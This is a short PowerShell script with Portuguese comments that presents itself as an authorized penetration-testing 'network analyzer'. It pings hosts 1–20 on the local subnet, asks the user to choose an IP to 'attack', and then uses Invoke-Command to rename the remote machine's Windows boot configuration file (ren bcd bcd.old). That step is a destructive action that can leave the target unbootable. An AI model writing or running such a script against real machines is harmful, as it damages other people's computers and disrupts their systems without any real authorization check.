# Script de Análise Real da Rede
# Autorizado para Penetration Testing

Write-Host "=== ANALISADOR DE REDE ===" -ForegroundColor Magenta

# Função para escanear IPs ativos
function Scan-Network {
    Write-Host "Analisando sua rede local..." -ForegroundColor Yellow
    
    # Obtém o IP local
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.PrefixOrigin -eq "Dhcp" -or $_.PrefixOrigin -eq "Manual"} | Select-Object -First 1).IPAddress
    
    if (!$localIP) {
        Write-Host "Erro: Não foi possível detectar seu IP local" -ForegroundColor Red
        return @()
    }
    
    Write-Host "Seu IP: $localIP" -ForegroundColor Green
    
    # Calcula a rede
    $ipParts = $localIP.Split('.')
    $networkBase = "$($ipParts[0]).$($ipParts[1]).$($ipParts[2])"
    Write-Host "Rede: $networkBase.0/24" -ForegroundColor Cyan
    Write-Host ""
    
    $activeIPs = @()
    Write-Host "Escaneando IPs 1-20..." -ForegroundColor White
    
    # Escaneia IPs de 1 a 20
    for ($i = 1; $i -le 20; $i++) {
        $targetIP = "$networkBase.$i"
        
        # Teste de ping
        $ping = New-Object System.Net.NetworkInformation.Ping
        $result = $ping.Send($targetIP, 500)
        
        if ($result.Status -eq "Success") {
            Write-Host "$targetIP - ATIVO" -ForegroundColor Green
            $activeIPs += $targetIP
        }
    }
    
    return $activeIPs
}

# INÍCIO DO SCRIPT
Clear-Host
Write-Host "=== ANALISADOR DE REDE ===" -ForegroundColor Magenta
Write-Host ""
    
# FASE 1: Análise da Rede
Write-Host "FASE 1: ANALISANDO SUA REDE" -ForegroundColor Green

$ips = Scan-Network

if ($ips.Count -eq 0) {
    Write-Host "Nenhum IP ativo encontrado na rede." -ForegroundColor Red
exit
}

Write-Host "`nIPS ATIVOS ENCONTRADOS:" -ForegroundColor Cyan
Write-Host "----------------------------------------" -ForegroundColor Cyan

for ($i = 0; $i -lt $ips.Count; $i++) {
    Write-Host "$($i+1). $($ips[$i])" -ForegroundColor White
}

Write-Host ""

# FASE 2: Seleção do Alvo
Write-Host "FASE 2: SELECIONAR ALVO" -ForegroundColor Green

do {
    Write-Host "Digite o número do IP que quer atacar:" -ForegroundColor Yellow
$choice = Read-Host "Numero"

if ($choice -ge 1 -and $choice -le $ips.Count) {
    $target = $ips[$choice-1]
    Write-Host "IP selecionado: $target" -ForegroundColor Green
    break
}
else {
    Write-Host "Número inválido. Digite entre 1 e $($ips.Count)" -ForegroundColor Red
}
} while ($true)

Write-Host ""

# FASE 3: Confirmação
Write-Host "Confirmar ataque em $target?" -ForegroundColor Yellow
$confirm = Read-Host "Digite S para SIM"

if ($confirm -eq "S" -or $confirm -eq "s") {
    Write-Host "Executando comando: ren bcd bcd.old" -ForegroundColor White


    Invoke-Command -ComputerName $target -ScriptBlock {
        ren bcd bcd.old
    }
    Write-Host "Comando executado com sucesso!" -ForegroundColor Green
}
else {
    Write-Host "Ataque cancelado" -ForegroundColor Yellow
}


Write-Host "`nScript finalizado" -ForegroundColor Magenta